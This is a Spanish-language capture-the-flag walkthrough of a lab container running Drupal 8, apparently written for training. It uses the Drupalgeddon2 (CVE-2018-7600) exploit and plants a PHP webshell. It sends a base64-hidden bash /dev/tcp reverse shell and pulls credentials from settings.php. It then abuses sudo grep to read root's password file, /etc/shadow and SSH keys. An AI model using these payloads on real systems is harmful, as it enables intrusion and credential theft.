
## 1. Reconocimiento

La web responde en el contenedor objetivo (172.17.0.2) y se identifica como Drupal 8 (cabecera y metatag X-Generator: v8.x). Drupal 8 temprano es el objetivo clasico de Drupalgeddon2.

---

## 2. Foothold: Drupalgeddon2 (CVE-2018-7600)

CVE-2018-7600 es una ejecucion remota de codigo no autenticada en Drupal, por una validacion insuficiente en la API de formularios (Form API) que permite inyectar propiedades de renderizado. Se explota con un PoC conocido (por ejemplo el script en Ruby drupalgeddon2):

```
ruby 44449.rb http://172.17.0.2/
```

El exploit confirma la ejecucion de codigo y escribe una webshell en la raiz web:

```
<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
```

A partir de ahi, RCE directa via curl:

```
curl 'http://172.17.0.2/shell.php' -d 'c=id'
```

Nota: la pseudo-shell del propio exploit filtra el caracter >. Es mas comodo hablar directamente con la webshell por curl, donde no hay ese filtro.

---

## 3. Reverse shell (sin python ni nc)

El contenedor no tiene python3 ni netcat, asi que la via es bash /dev/tcp. Como el caracter > molesta en algunos filtros, se esconde el payload en base64 y se manda directamente a la webshell:

```
# listener en el host
penelope 4444

# disparo via la webshell (base64 = bash -i >& /dev/tcp/172.17.0.1/4444 0>&1)
curl -s 'http://172.17.0.2/shell.php' --data-urlencode \
  'c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash'
```

La conexion aterriza como www-data. Para estabilizar la tty (la shell inicial no tiene PTY, los comandos salen duplicados):

```
script -qc /bin/bash /dev/null
```

---

## 4. Lateral: credenciales filtradas en settings.php

En Drupal, el fichero de configuracion sites/default/settings.php suele guardar credenciales. Aqui, ademas, el sysadmin dejo unas credenciales en un comentario del bloque de ejemplo:

```
cat /var/www/html/sites/default/settings.php
...
 *   'username' => 'ballenita',
 *   'password' => 'ballenitafeliz',
```

Y /etc/passwd confirma que ballenita es una usuaria del sistema con shell:

```
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Reutilizacion de credenciales directa. Con la PTY estable:

```
su ballenita
# password: ballenitafeliz
```

---

## 5. Escalada a root: sudo + grep (GTFOBins)

Como ballenita, los permisos sudo son el camino:

```
sudo -l
...
User ballenita may run the following commands on aecaf498b887:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Ni ls ni grep dan shell por si mismos, pero ambos leen ficheros como root. grep con un patron que haga match con todo (la cadena vacia) imprime cualquier fichero del sistema:

```
sudo /bin/ls -la /root/
sudo /bin/grep '' /root/secretitomaximo.txt
```

Ese fichero contenia la contraseña de root en texto claro:

```
nobodycanfindthispasswordrootrocks
```

Con ella, salto directo a root:

```
su root
# password: nobodycanfindthispasswordrootrocks
```

root conseguido.

Variante mas general: si no hubiera habido una contraseña servida en bandeja, el mismo grep habria valido para leer /etc/shadow (y crackear el hash de root) o una clave SSH privada de root:

```
sudo /bin/grep '' /etc/shadow
sudo /bin/grep '' /root/.ssh/id_rsa
```
